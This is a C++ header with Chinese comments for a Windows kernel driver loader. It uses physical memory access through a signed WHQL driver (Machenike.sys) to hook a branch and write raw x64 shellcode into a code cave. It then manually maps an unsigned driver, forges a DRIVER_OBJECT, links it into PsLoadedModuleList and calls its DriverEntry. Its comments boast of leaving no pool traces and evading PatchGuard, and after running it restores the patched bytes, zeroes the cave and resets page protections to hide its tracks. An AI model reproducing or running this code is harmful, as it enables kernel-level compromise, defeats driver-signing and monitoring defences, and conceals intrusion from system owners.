#pragma once
#include "loader_common.h"
#include "phys_walk.h"
#include "manual_map.h"

// ============================================================
// shellcode_builder.h — 内核 Shellcode 构造器
//
// 职责：
//   1. 扫描 WHQL 驱动 default 分支位置（物理特征码搜索）
//   2. 备份原始字节
//   3. 构造 Shellcode：
//      a. MmAllocatePagesForMdl → 分配游离物理内存 (零 PoolBigPageTable 痕迹)
//      b. 物理写入 mswsk.sys 展开镜像（通过用户态缓冲区物理地址）
//      c. 构造伪 DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
//      d. 挂入 PsLoadedModuleList
//      e. 调用 mswsk.sys DriverEntry
//      f. 恢复 WHQL default 分支原始字节
//   4. 将 Shellcode 写入 WHQL 驱动 default 分支位置
// ============================================================

// ---- 扫描 WHQL 驱动的 default 分支物理位置 ----
// 特征：mov ebx, STATUS_INVALID_PARAMETER (0xC000000D); jmp rel32
// IDA 逆向实测：BB 0D 00 00 C0 E9

static const uint8_t WHQL_DEFAULT_SIG[] = {
    0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xE9  // mov ebx, 0xC000000D; jmp rel32
};

struct WhqlPatchSite {
    uint64_t kernVA;    // WHQL 驱动代码段中的内核 VA
    uint64_t physAddr;  // 对应物理地址
    uint8_t  original[64]; // 备份原始字节
};

// 在物理内存的 WHQL 驱动代码段范围内扫描 default 特征码
static bool FindWhqlDefaultBranch(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t whqlDrvBase,   // WHQL 驱动内核 VA 基址（从 PsLoadedModuleList 读取）
    uint32_t whqlDrvSize,   // 驱动镜像大小
    WhqlPatchSite& site)
{
    LOG_INFO("FindWhqlDefaultBranch: scanning WHQL driver 0x%016llX size=0x%X",
             whqlDrvBase, whqlDrvSize);

    // 在驱动虚拟地址空间内逐 4KB 页扫描
    for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
        uint64_t pageVA = whqlDrvBase + off;
        uint64_t pagePA = 0;
        if (!VirtToPhys(hDev, cr3, pageVA, &pagePA)) continue;

        uint8_t pageBuf[0x1000] = {};
        if (!WhqlReadPhys(hDev, pagePA, pageBuf, sizeof(pageBuf))) continue;

        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) < sizeof(pageBuf); i++) {
            if (memcmp(pageBuf + i, WHQL_DEFAULT_SIG, sizeof(WHQL_DEFAULT_SIG)) == 0) {
                site.kernVA  = pageVA + i;
                site.physAddr = pagePA + i;
                memcpy(site.original, pageBuf + i,
                       min(sizeof(site.original), sizeof(pageBuf) - i));
                LOG_OK("FindWhqlDefaultBranch: found at VA=0x%016llX PA=0x%016llX",
                       site.kernVA, site.physAddr);
                return true;
            }
        }
    }
    LOG_ERR("FindWhqlDefaultBranch: signature not found");
    return false;
}

// ---- 从本地 ntoskrnl.exe 导出表解析 PsLoadedModuleList 的内核虚拟地址 ----
static uint64_t ResolvePsLoadedModuleList(uint64_t ntoskrnlBase)
{
    wchar_t sysPath[MAX_PATH] = {};
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hNtos = LoadLibraryExW(sysPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    }
    if (!hNtos) {
        LOG_ERR("ResolvePsLoadedModuleList: Failed to load ntoskrnl.exe");
        return 0;
    }

    FARPROC proc = GetProcAddress(hNtos, "PsLoadedModuleList");
    if (!proc) {
        LOG_ERR("ResolvePsLoadedModuleList: PsLoadedModuleList export not found in ntoskrnl.exe");
        FreeLibrary(hNtos);
        return 0;
    }

    uint32_t rva = (uint32_t)((uint8_t*)proc - (uint8_t*)hNtos);
    FreeLibrary(hNtos);

    uint64_t psLoadedModuleListVA = ntoskrnlBase + rva;
    LOG_OK("ResolvePsLoadedModuleList: PsLoadedModuleList RVA=0x%X -> VA=0x%016llX",
           rva, psLoadedModuleListVA);
    return psLoadedModuleListVA;
}

// ---- 通过 Psapi 枚举设备驱动作为备用定位方案 ----
static bool FindWhqlModuleViaPsapi(
    const wchar_t* targetName,
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int count = cbNeeded / sizeof(drivers[0]);
        for (int i = 0; i < count; i++) {
            wchar_t baseName[MAX_PATH] = {};
            if (GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH)) {
                if (_wcsicmp(baseName, targetName) == 0) {
                    outDllBase = (uint64_t)drivers[i];
                    // 获取本地驱动文件的 SizeOfImage
                    wchar_t drvPath[MAX_PATH] = {};
                    if (FindWhqlDriverFile(drvPath, MAX_PATH)) {
                        auto raw = ReadFile(drvPath);
                        if (raw.size() > sizeof(IMAGE_DOS_HEADER)) {
                            auto* dos = (IMAGE_DOS_HEADER*)raw.data();
                            if (dos->e_magic == IMAGE_DOS_SIGNATURE && dos->e_lfanew < (LONG)raw.size()) {
                                auto* nt = (IMAGE_NT_HEADERS64*)(raw.data() + dos->e_lfanew);
                                if (nt->Signature == IMAGE_NT_SIGNATURE) {
                                    outSizeOfImage = nt->OptionalHeader.SizeOfImage;
                                }
                            }
                        }
                    }
                    if (outSizeOfImage == 0) {
                        outSizeOfImage = 0x20000;
                    }
                    LOG_OK("FindWhqlModuleViaPsapi: found %ls base=0x%016llX size=0x%X",
                           targetName, outDllBase, outSizeOfImage);
                    return true;
                }
            }
        }
    }
    LOG_ERR("FindWhqlModuleViaPsapi: '%ls' not found via EnumDeviceDrivers", targetName);
    return false;
}

// ---- 查找 WHQL 驱动在 PsLoadedModuleList 中的条目 ----
static bool FindWhqlModuleInLdr(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t psLoadedModuleList,  // PsLoadedModuleList 内核 VA
    const wchar_t* targetName,    // 如 L"Machenike.sys"
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage,
    uint64_t& outLdrEntryVA)      // 该 LDR 条目的内核 VA（KLDR_DATA_TABLE_ENTRY*）
{
    if (psLoadedModuleList == 0) return false;
    uint64_t head = psLoadedModuleList;
    uint64_t cur  = 0;
    // 读取链表头的 Flink
    if (!ReadKernelVA(hDev, cr3, head, &cur, 8)) return false;

    int limit = 512;
    while (cur != head && limit-- > 0) {
        KLDR_ENTRY_K entry = {};
        if (!ReadKernelVA(hDev, cr3, cur, &entry, sizeof(entry))) break;

        if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
            size_t cch = entry.BaseDllName.Length / 2;
            std::vector<wchar_t> nameBuf(cch + 1, 0);
            ReadKernelVA(hDev, cr3, entry.BaseDllName.Buffer,
                         nameBuf.data(), cch * 2);
            nameBuf[cch] = 0;

            if (_wcsicmp(nameBuf.data(), targetName) == 0) {
                outDllBase     = entry.DllBase;
                outSizeOfImage = entry.SizeOfImage;
                outLdrEntryVA  = cur; // cur = KLDR_DATA_TABLE_ENTRY 内核 VA（InLoadOrderLinks 在偏移 0）
                LOG_OK("FindWhqlModuleInLdr: found %ls base=0x%016llX size=0x%X LdrEntry=0x%016llX",
                       targetName, outDllBase, outSizeOfImage, outLdrEntryVA);
                return true;
            }
        }
        cur = entry.Flink;
    }
    LOG_ERR("FindWhqlModuleInLdr: '%ls' not found", targetName);
    return false;
}

// ================================================================
// Shellcode 数据结构（分支 2B 完整契约版，120 字节 = 0x78）
// 这部分数据随 Shellcode 一起写入 Code Cave，由 Shellcode 运行时读取
// ================================================================
#pragma pack(push, 1)
struct ShellcodeParams {
    uint64_t pfnMmAllocatePagesForMdl;    // 0x00 ntoskrnl 导出 MmAllocatePagesForMdl
    uint64_t pfnMmMapIoSpace;             // 0x08 ntoskrnl 导出 MmMapIoSpace
    uint64_t pfnMmUnmapIoSpace;           // 0x10 ntoskrnl 导出 MmUnmapIoSpace
    uint64_t userImageVA;                 // 0x18 用户态展开镜像的虚拟地址 (处于 Loader 线程当前 CR3 下)
    uint64_t payloadTargetVA;             // 0x20 宿主驱动内部挂接目标内核 VA
    uint32_t imageSize;                   // 0x28 SizeOfImage
    uint32_t entryPointOffset;            // 0x2C DriverEntry 相对于镜像基址的偏移
    uint32_t pageCount;                   // 0x30 映射的 4KB 物理页数量
    uint32_t status;                      // 0x34 NT STATUS 执行结果
    uint64_t firstPtePA;                  // 0x38 宿主驱动目标节区起始 PTE 物理地址
    uint64_t hookReturnVA;                // 0x40 跳回 WHQL 宿主驱动现场 (site.kernVA + 5)
    uint64_t whqlDrvBase;                 // 0x48 宿主驱动基址 → fakeDriverObj.DriverStart
    uint32_t whqlDrvSize;                 // 0x50 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
    uint32_t pad0;                        // 0x54 占位对齐
    uint64_t whqlLdrEntryVA;              // 0x58 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
    DRV_BOOT_CONFIG bootConfig;           // 0x60 (20 字节) Loader 注入给 DriverEntry 的启动参数
    uint32_t pad1;                        // 0x74 (4 字节) 补齐到 120 字节
};
#pragma pack(pop)
static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exactly 120 bytes (0x78)");

// ================================================================
// 分支 2B：宿主驱动原位 PTE 缝合与直接搬移 Shellcode (x64, 333 字节)
//
// 核心突破（彻底移除用户态物理写与 ZwMapViewOfSection）：
//   1. 纯内核态调用 MmAllocatePagesForMdl 申请纯游离物理页 (零 PoolBigPageTable 痕迹)
//   2. 调用 MmMapIoSpace 映射宿主驱动目标 34 个 PTE，翻转 PFN 并逐页 invlpg
//   3. 调用 MmUnmapIoSpace 解除 PTE 临时映射
//   4. 利用当前 CR3 原生直读特权，执行 rep movsb 瞬时硬件级直拷用户态镜像 (0 次 IOCTL, 0 次 ZwMapViewOfSection!)
//   5. 写入 Canary 头部 -> 构造 fakeDriverObj -> 调用 DriverEntry
//   6. 平栈跳回 WHQL 宿主现场完成 IRP，状态码原样传回
// ================================================================
static const uint8_t scBranch2B[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54, 
    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x49, 0x8B, 0xDB, 0x48, 0x81, 0xEC, 0x48, 0x02, 0x00, 0x00, 
    0x48, 0x33, 0xC9, 0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC0, 
    0x44, 0x8B, 0x4B, 0x28, 0xFF, 0x13, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xE6, 0x00, 0x00, 0x00, 0x4C, 
    0x8B, 0xE0, 0x48, 0x8B, 0x4B, 0x38, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
    0x45, 0x33, 0xC0, 0xFF, 0x53, 0x08, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xC6, 0x00, 0x00, 0x00, 0x4C, 
    0x8B, 0xE8, 0x45, 0x33, 0xF6, 0x44, 0x3B, 0x73, 0x30, 0x7D, 0x28, 0x4B, 0x8B, 0x44, 0xF4, 0x30, 
    0x48, 0xC1, 0xE0, 0x0C, 0x48, 0x83, 0xC8, 0x63, 0x4B, 0x89, 0x44, 0xF5, 0x00, 0x48, 0x8B, 0x43, 
    0x20, 0x41, 0x8B, 0xCE, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x03, 0xC1, 0x0F, 0x01, 0x38, 0x41, 0xFF, 
    0xC6, 0xEB, 0xD2, 0x49, 0x8B, 0xCD, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
    0xFF, 0x53, 0x10, 0x48, 0x8B, 0x73, 0x18, 0x48, 0x8B, 0x7B, 0x20, 0x8B, 0x4B, 0x28, 0xF3, 0xA4, 
    0x48, 0x8B, 0x7B, 0x20, 0x48, 0xB8, 0x31, 0x30, 0x56, 0x52, 0x44, 0x4B, 0x53, 0x57, 0x48, 0x89, 
    0x07, 0x48, 0x8B, 0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x8B, 0x43, 0x28, 0x89, 0x47, 0x10, 0x48, 
    0x8D, 0x7C, 0x24, 0x40, 0x33, 0xC0, 0xB9, 0x2A, 0x00, 0x00, 0x00, 0xF3, 0x48, 0xAB, 0x48, 0x8D, 
    0x7C, 0x24, 0x40, 0x66, 0xC7, 0x07, 0x04, 0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 0x48, 0x8B, 
    0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x48, 0x8B, 0x43, 0x48, 0x48, 0x89, 0x47, 0x18, 0x8B, 0x43, 
    0x50, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x58, 0x48, 0x89, 0x47, 0x28, 0x48, 0x8B, 0xCF, 0x48, 
    0x8D, 0x53, 0x60, 0x48, 0x8B, 0x43, 0x20, 0x4C, 0x63, 0x43, 0x2C, 0x49, 0x03, 0xC0, 0xFF, 0xD0, 
    0x89, 0x43, 0x34, 0xEB, 0x07, 0xC7, 0x43, 0x34, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x81, 0xC4, 0x48, 
    0x02, 0x00, 0x00, 0x4C, 0x8B, 0x5B, 0x40, 0x8B, 0x5B, 0x34, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 
    0x41, 0x5C, 0x5F, 0x5E, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x41, 0xFF, 0xE3
};
static const size_t scBranch2B_size = sizeof(scBranch2B);

// 查找驱动代码段中的安全空洞 (Code Cave)
static uint64_t FindWhqlCodeCaveVA(HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, size_t neededSize)
{
    // IDA 逆向实测：Machenike.sys 的 .text 段末尾在 0x140002831 ~ 0x140002A00
    // 有 463 字节的连续 0x00 填充空间（偏移 0x2840）
    uint64_t candidateVA = whqlDrvBase + 0x2840;
    std::vector<uint8_t> buf(neededSize, 0);
    if (ReadKernelVA(hDev, cr3, candidateVA, buf.data(), neededSize)) {
        bool allZeroOrInt3 = true;
        for (uint8_t b : buf) {
            if (b != 0x00 && b != 0xCC && b != 0x90) {
                allZeroOrInt3 = false;
                break;
            }
        }
        if (allZeroOrInt3) {
            LOG_OK("FindWhqlCodeCaveVA: Found safe code cave VA=0x%016llX (size=%zu bytes)",
                   candidateVA, neededSize);
            return candidateVA;
        }
    }
    LOG_WARN("FindWhqlCodeCaveVA: Candidate cave not completely zeroed, using reserved cave VA=0x%016llX", candidateVA);
    return candidateVA;
}

struct InjectContext {
    HANDLE         hDev;
    uint64_t       cr3;
    uint64_t       ntoskrnlBase;
    uint64_t       psLoadedModuleList;
    uint64_t       whqlDrvBase;      // 宿主驱动内核 VA → fakeDriverObj.DriverStart
    uint32_t       whqlDrvSize;      // 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
    uint64_t       whqlLdrEntryVA;   // 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
    MappedImage*   pImg;
    uint64_t       userImageVA;      // 用户态展开镜像的虚拟地址 (处于当前 CR3 下)
    uint64_t       payloadTargetVA;  // 宿主驱动内部挂接目标内核 VA
    uint64_t       firstPtePA;       // 宿主目标 PTE 起始物理地址
    uint32_t       pageCount;        // 映射的 4KB 物理页数量
    uint64_t       hookReturnVA;     // 跳回宿主驱动现场 (site.kernVA + 5)
    DRV_BOOT_CONFIG bootConfig;      // 注入给 DriverEntry 的启动参数
};

// 本地快速计算 + 内核导出表兜底解析 ntoskrnl 导出函数
static uint64_t ResolveNtosExport(HANDLE hDev, uint64_t cr3, uint64_t ntoskrnlBase, const char* name)
{
    wchar_t sysPath[MAX_PATH] = {};
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hNtos = LoadLibraryExW(sysPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    }
    if (hNtos) {
        FARPROC proc = GetProcAddress(hNtos, name);
        if (proc) {
            uint32_t rva = (uint32_t)((uint8_t*)proc - (uint8_t*)hNtos);
            FreeLibrary(hNtos);
            return ntoskrnlBase + rva;
        }
        FreeLibrary(hNtos);
    }

    return FindKernelExport(hDev, cr3, ntoskrnlBase, name);
}

// 步骤 1：解析 Shellcode 所需的所有内核函数地址并构建参数块 (分支 2B)
static bool BuildShellcodeParams(const InjectContext& ctx,
                                  ShellcodeParams& params)
{
    memset(&params, 0, sizeof(params));

    params.pfnMmAllocatePagesForMdl = ResolveNtosExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, "MmAllocatePagesForMdl");
    if (!params.pfnMmAllocatePagesForMdl) {
        params.pfnMmAllocatePagesForMdl = ResolveNtosExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, "MmAllocatePagesForMdlEx");
    }
    params.pfnMmMapIoSpace   = ResolveNtosExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, "MmMapIoSpace");
    params.pfnMmUnmapIoSpace = ResolveNtosExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, "MmUnmapIoSpace");

    if (!params.pfnMmAllocatePagesForMdl || !params.pfnMmMapIoSpace || !params.pfnMmUnmapIoSpace) {
        LOG_ERR("BuildShellcodeParams: Failed to resolve kernel exports (MmAlloc=0x%llX, MapIo=0x%llX, UnmapIo=0x%llX)",
                params.pfnMmAllocatePagesForMdl, params.pfnMmMapIoSpace, params.pfnMmUnmapIoSpace);
        return false;
    }

    LOG_HEX("  %-40s 0x%016llX", "MmAllocatePagesForMdl", params.pfnMmAllocatePagesForMdl);
    LOG_HEX("  %-40s 0x%016llX", "MmMapIoSpace",           params.pfnMmMapIoSpace);
    LOG_HEX("  %-40s 0x%016llX", "MmUnmapIoSpace",         params.pfnMmUnmapIoSpace);

    params.userImageVA        = ctx.userImageVA;
    params.payloadTargetVA    = ctx.payloadTargetVA;
    params.imageSize          = ctx.pImg ? ctx.pImg->SizeOfImage : 0;
    params.entryPointOffset   = ctx.pImg ? (uint32_t)ctx.pImg->EntryPointOffset : 0;
    params.pageCount          = ctx.pageCount ? ctx.pageCount : ((params.imageSize + 0xFFF) / 0x1000);
    params.status             = 0;
    params.firstPtePA         = ctx.firstPtePA;
    params.hookReturnVA       = ctx.hookReturnVA;
    params.whqlDrvBase        = ctx.whqlDrvBase;
    params.whqlDrvSize        = ctx.whqlDrvSize;
    params.whqlLdrEntryVA     = ctx.whqlLdrEntryVA;
    params.bootConfig         = ctx.bootConfig;

    LOG_OK("BuildShellcodeParams (Branch 2B): params ready (PtePA=0x%016llX Pages=%u TargetVA=0x%016llX UserVA=0x%016llX RetVA=0x%016llX)",
           params.firstPtePA, params.pageCount, params.payloadTargetVA, params.userImageVA, params.hookReturnVA);
    return true;
}

// ================================================================
static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint32_t drvOrigSize, const wchar_t* drvName)
{
    if (!drvBase) return false;
    DRV_WSK_CANARY canary = {};

    // 1. 优先检查合法空闲对齐区 (drvBase + drvOrigSize)
    if (drvOrigSize > 0) {
        if (ReadKernelVA(hDev, cr3, drvBase + drvOrigSize, &canary, sizeof(canary))) {
            if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
                LOG_OK("================================================================");
                LOG_OK("[+] Core driver (mswsk) CANARY FOUND in host '%ls' extension area (offset +0x%X)!", drvName, drvOrigSize);
                LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                       canary.KernelImageVA, canary.ImageSize);
                LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
                LOG_OK("================================================================");
                return true;
            }
        }
    }

    // 2. 检查宿主驱动内部 Discardable / INIT / .reloc 节区首部的 Canary 暗桩（零白驱动 PE 头修改）
    if (drvOrigSize > 0) {
        uint8_t hdrBuf[0x1000] = {};
        if (ReadKernelVA(hDev, cr3, drvBase, hdrBuf, sizeof(hdrBuf))) {
            auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE &&
                dos->e_lfanew < (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64)))
            {
                auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
                if (nt->Signature == IMAGE_NT_SIGNATURE) {
                    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                        auto* s = &IMAGE_FIRST_SECTION(nt)[i];
                        uint32_t rva = s->VirtualAddress;
                        if (rva == 0 || rva >= drvOrigSize) continue;

                        DRV_WSK_CANARY secCanary = {};
                        if (ReadKernelVA(hDev, cr3, drvBase + rva, &secCanary, sizeof(secCanary))) {
                            if (secCanary.Magic == DRV_WSK_CANARY_MAGIC) {
                                char sName[9] = {};
                                memcpy(sName, s->Name, 8);
                                LOG_OK("================================================================");
                                LOG_OK("[+] Core driver (mswsk) CANARY FOUND in host '%ls' section '%s' (RVA=0x%X)!",
                                       drvName, sName, rva);
                                LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                                       secCanary.KernelImageVA, secCanary.ImageSize);
                                LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
                                LOG_OK("================================================================");
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }

    // 3. 方案 5：快速扫描纯游离物理页窗口 [256MB ~ 1GB] 的 GUID 签名暗桩 (彻底免疫 PatchGuard 0x109)
    {
        static const GUID targetGuid = { DRV_CANARY_GUID_D1, DRV_CANARY_GUID_D2, DRV_CANARY_GUID_D3, DRV_CANARY_GUID_D4 };
        uint8_t probeBuf[sizeof(DRV_WSK_CANARY)] = {};
        for (uint64_t pa = DRV_CANARY_WINDOW_LOW; pa < 0x40000000ULL; pa += 0x1000) {
            if (WhqlReadPhys(hDev, pa, probeBuf, sizeof(probeBuf))) {
                PDRV_WSK_CANARY pProbe = (PDRV_WSK_CANARY)probeBuf;
                if (pProbe->Magic == DRV_WSK_CANARY_MAGIC &&
                    memcmp(&pProbe->Signature, &targetGuid, sizeof(GUID)) == 0)
                {
                    LOG_OK("================================================================");
                    LOG_OK("[+] Core driver (mswsk) HEADLESS CANARY FOUND in physical RAM (PA=0x%016llX)!", pa);
                    LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                           pProbe->KernelImageVA, pProbe->ImageSize);
                    LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
                    LOG_OK("================================================================");
                    return true;
                }
            }
        }
    }

    return false;
}

static inline bool ClearDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase = 0)
{
    DRV_WSK_CANARY zeroCanary = {};
    bool ok = true;
    if (drvBase) {
        ok = WriteKernelVA(hDev, cr3, drvBase + 0x28, &zeroCanary, sizeof(zeroCanary));
    }
    // 方案 5：扫描并清零游离物理页 Canary 签名
    static const GUID targetGuid = { DRV_CANARY_GUID_D1, DRV_CANARY_GUID_D2, DRV_CANARY_GUID_D3, DRV_CANARY_GUID_D4 };
    uint8_t probeBuf[sizeof(DRV_WSK_CANARY)] = {};
    for (uint64_t pa = DRV_CANARY_WINDOW_LOW; pa < DRV_CANARY_WINDOW_HIGH; pa += 0x1000) {
        if (WhqlReadPhys(hDev, pa, probeBuf, sizeof(probeBuf))) {
            PDRV_WSK_CANARY pProbe = (PDRV_WSK_CANARY)probeBuf;
            if (pProbe->Magic == DRV_WSK_CANARY_MAGIC &&
                memcmp(&pProbe->Signature, &targetGuid, sizeof(GUID)) == 0)
            {
                WhqlWritePhys(hDev, pa, &zeroCanary, sizeof(zeroCanary));
                LOG_OK("[+] Cleared Headless Canary in physical RAM (PA=0x%016llX)", pa);
                break;
            }
        }
    }
    return ok;
}

// ================================================================
// 主入口：LoadDrvWsk
//
// 完整加载流程：
//   1. 打开 WHQL 设备句柄
//   2. 获取 CR3 / KernBase / PsLoadedModuleList
//   3. 检查内核物理暗桩（方案 1，避免重复加载）
//   4. 扫描 default 分支特征码
//   5. 读取并展开 mswsk.sys PE 镜像（manual map）
//   6. 修复重定位 + IAT
//   7. 抹除 PE 头
//   8. 锁定用户态展开镜像页并获取物理地址
//   9. 构建 ShellcodeParams 并注入 Code Cave
//  10. 触发 default 分支执行
//  11. 恢复 WHQL default 分支并写入内核暗桩标记
// ================================================================
// 完整注入 Shellcode：将 ShellcodeParams 写入 Code Cave，并将 default 分支转向 Code Cave
static bool InjectShellcodeFull(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    const ShellcodeParams& params,
    const uint8_t*       pScCode = scBranch2B,
    size_t               scCodeSize = scBranch2B_size)
{
    const uint8_t* sc = (pScCode && scCodeSize) ? pScCode : scBranch2B;
    size_t scSz       = (pScCode && scCodeSize) ? scCodeSize : scBranch2B_size;

    // 0. 确保 Code Cave 虚拟页具备内核可写权限（PTE.RW = 1），防止 Shellcode 写回状态时触发 0xBE 蓝屏
    EnsureKernelPageWritable(hDev, cr3, caveVA);

    // 1. 将 ShellcodeParams 写入 Code Cave 的起始位置
    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
        LOG_ERR("InjectShellcodeFull: Failed to write ShellcodeParams to Code Cave");
        return false;
    }

    // 2. 将 sc 紧随其后写入 Code Cave
    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA(hDev, cr3, scEntryVA, sc, scSz)) {
        LOG_ERR("InjectShellcodeFull: Failed to write shellcode bytes to Code Cave");
        return false;
    }

    // 3. 构建 JMP rel32 跳转指令（E9 <disp32>）挂钩 default 分支
    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);

    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        LOG_ERR("InjectShellcodeFull: Failed to hook default branch");
        return false;
    }
    LOG_OK("InjectShellcodeFull: Default branch hooked -> Code Cave VA=0x%016llX (disp=0x%08X, size=%zu)",
           scEntryVA, disp, scSz);
    return true;
}

// 恢复 WHQL default 分支原始指令并清理 Code Cave
static bool RestoreWhqlDefaultBranch(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    size_t               caveCleanSize)
{
    // 恢复 default 分支原始指令 (5 字节)
    if (!WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5)) {
        LOG_WARN("RestoreWhqlDefaultBranch: Failed to restore default branch original bytes");
    } else {
        LOG_OK("RestoreWhqlDefaultBranch: Default branch original bytes restored successfully");
    }

    // 清理 Code Cave (抹除痕迹)
    if (caveVA && caveCleanSize) {
        std::vector<uint8_t> zeros(caveCleanSize, 0);
        WriteKernelVA(hDev, cr3, caveVA, zeros.data(), zeros.size());
        LOG_OK("RestoreWhqlDefaultBranch: Code Cave memory zeroed and cleaned");

        // 恢复 Code Cave 页的原始只读属性
        uint64_t ptePA = 0, curPte = 0;
        if (GetPtePhysAddr(hDev, cr3, caveVA, &ptePA, &curPte) && (curPte & PTE_RW)) {
            uint64_t roPte = curPte & ~PTE_RW;
            WhqlWritePhys(hDev, ptePA, &roPte, sizeof(roPte));
            LOG_OK("RestoreWhqlDefaultBranch: Code Cave PTE restored to Read-Only (PA=0x%016llX)", ptePA);
        }
    }
    return true;
}

// 验证从 startVA 开始的 size 字节区域中，每一个 4KB 页的 PTE 是否均处于 Present 状态
static bool ArePagesPresent(HANDLE hDev, uint64_t cr3, uint64_t startVA, size_t size)
{
    const uint64_t PAGE = 0x1000;
    uint64_t endVA = startVA + size;
    for (uint64_t cur = startVA; cur < endVA; cur += PAGE) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, cur, &pa))
            return false;
    }
    if (size > 0) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, endVA - 1, &pa))
            return false;
    }
    return true;
}

// ================================================================
// 扫描宿主驱动节区内部，寻找能容纳 neededBytes 的连续物理页空洞。
// 必须严格通过 ArePagesPresent 验证每一个 4KB 页的 PTE.Present==1，
// 杜绝因选择已丢弃节区（DISCARDABLE）而导致 WriteKernelVA 失败。
// 返回 RVA（相对于宿主 DllBase），0 表示未找到。
// ================================================================
static inline uint32_t FindHostInternalCave(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    IMAGE_NT_HEADERS64* nt,          // 指向用户态 hdrBuf 内的 NT 头（只读节表）
    uint32_t       neededBytes,
    const char*    hostDrvNameA)
{
    const uint32_t PAGE = 0x1000;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD  nSec = nt->FileHeader.NumberOfSections;

    LOG_INFO("FindHostInternalCave[%s]: scanning %u sections for cave >= 0x%X bytes...",
             hostDrvNameA, nSec, neededBytes);

    // --- 打印宿主节区诊断信息 ---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
